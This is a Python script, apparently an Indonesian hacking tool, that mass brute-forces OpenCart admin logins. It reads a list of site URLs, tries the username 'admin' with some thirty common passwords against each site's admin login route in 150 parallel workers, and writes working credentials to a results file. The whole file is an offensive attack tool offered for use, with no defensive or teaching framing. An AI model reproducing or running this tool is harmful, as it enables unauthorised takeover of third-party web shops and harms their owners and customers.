import requests as r
import os
import sys
from platform import system
from multiprocessing import Pool
from multiprocessing.dummy import Pool as ThreadPool

# Regular Colors
R = "\033[0;31m"          # Red
G = "\033[0;32m"        # Green
Y = "\033[0;33m"       # Yellow
B = "\033[0;34m"         # Blue
P = "\033[0;35m"       # Purple
C = "\033[0;36m"         # Cyan
W = "\033[0;37m"        # White
# Regular Colors

if system() == 'Linux':
	os.system('clear')
if system() == 'Windows':
	os.system('cls')

banner = '''
  /$$$$$                                /$$$$$$  /$$                             /$$    
   |__  $$                               /$$__  $$| $$                            | $$    
      | $$  /$$$$$$  /$$    /$$ /$$$$$$ | $$  \__/| $$$$$$$   /$$$$$$   /$$$$$$$ /$$$$$$  
      | $$ |____  $$|  $$  /$$/|____  $$| $$ /$$$$| $$__  $$ /$$__  $$ /$$_____/|_  $$_/  
 /$$  | $$  /$$$$$$$ \  $$/$$/  /$$$$$$$| $$|_  $$| $$  \ $$| $$  \ $$|  $$$$$$   | $$    
| $$  | $$ /$$__  $$  \  $$$/  /$$__  $$| $$  \ $$| $$  | $$| $$  | $$ \____  $$  | $$ /$$
|  $$$$$$/|  $$$$$$$   \  $/  |  $$$$$$$|  $$$$$$/| $$  | $$|  $$$$$$/ /$$$$$$$/  |  $$$$/
 \______/  \_______/    \_/    \_______/ \______/ |__/  |__/ \______/ |_______/    \___/  
                                                                                          
Coded by ./H1RUK4                         
Telegram : https://t.me/hiruka404                                                                                         
                                                                                          
'''

def brute(url):
    password = ["123", "uT3ygfF44Cdlp4TFyq", "admin", "123456", "pass", "password", "admin123", "12345",
                        "admin@123", "123", "test",
                        "123456789", "1234", "12345678", "123123", "demo", "blah", "hello", "1234567890", "zx321654xz",
                        "1234567", "adminadmin", "welcome", "666666", "access", "1q2w3e4r", "xmagico", "admin1234", "1q2w3e4r", "xxx", "pass@123"]
    for passwd in password:
        try:
            url = url.strip()
            head = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/28.0'}
            payload = {'username':'admin', 'password': passwd}
            login = r.post(url + '/admin/index.php?route=common/login', headers = head, data = payload, timeout = 5)
            if 'logout' in login.text:
                print( G + url + "|" + "admin" + "|" + passwd + "[BERHASIL]" )
                open('hasil.txt', 'a').write(url + '|' + 'admin' + '|' + passwd + '\n')
            else:
                print( R + url + "|" + "admin" + "|" + passwd + "[GAGAL]" )
        except:
            pass


def main():
    listsite = open(sys.argv[1], 'r').readlines()
    try:
        ThreadPool = Pool(150)
        ThreadPool.map(brute, listsite)
    except:
        pass


if __name__ == "__main__":
    if len(sys.argv) < 2:
        print G + banner
        print "Usage : python " + sys.argv[0] + " list.txt"
    else:
        print G + banner
        main()